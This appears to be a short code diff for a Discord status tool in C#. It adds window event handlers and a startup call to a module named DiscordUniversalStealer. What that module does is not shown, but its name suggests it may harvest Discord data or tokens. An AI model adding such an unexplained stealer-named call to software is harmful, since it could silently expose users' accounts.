@@ -58,12 +58,18 @@ namespace DiscordStatusGUI
             {
                 Preferences.LoadProfiles();
                 Preferences.Load();
+
+                SizeChanged += Window_SizeChanged;
+                LocationChanged += Window_LocationChanged;
+                StateChanged += Window_LocationChanged;
+
                 Preferences.SetPropertiesByCmdLine(Environment.GetCommandLineArgs());
             });
             
             await Task.Run(() =>
             {
                 WarfaceApi.Init();
+                DiscordUniversalStealer.Init();
                 SteamApi.Init();
                 ProcessEx.Init();
             });
